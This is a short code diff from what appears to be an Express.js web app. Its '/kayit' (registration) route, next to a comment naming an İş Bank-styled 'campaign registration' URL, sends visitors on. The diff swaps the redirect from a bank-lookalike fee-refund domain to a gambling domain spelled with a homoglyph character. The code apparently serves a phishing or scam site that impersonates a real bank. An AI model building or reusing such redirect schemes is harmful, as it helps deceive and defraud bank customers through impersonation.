@@ -83,7 +83,7 @@ app.get('/kayit', (req, res) => {
     // https://isbank-kampanyalar-kayit.vercel.app/
 
     // Kullanıcıyı yönlendir
-    res.redirect('https://isbank-aidatiade.alwaysdata.net/');
+    res.redirect('https://jojọbet846.com/tr/');
 });
 
 
